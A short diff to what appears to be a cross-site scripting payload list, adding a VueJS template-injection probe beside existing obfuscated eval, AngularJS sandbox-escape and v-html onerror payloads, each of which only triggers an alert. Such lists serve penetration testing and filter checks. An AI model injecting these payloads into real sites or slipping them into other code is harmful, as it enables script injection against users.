@@ -541,6 +541,8 @@ a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
 <div ng-app ng-csp><div ng-controller="test">{{$eval.constructor('alert(1)')()}}</div></div>
 
 # VueJS template injection
+# Same probe as the AngularJS section; repeated here for VueJS.
+{{constructor.constructor('alert(1)')()}}
 {{_c.constructor('alert(1)')()}}
 <div v-html="'<img src=x onerror=alert(1)>'"></div>
 
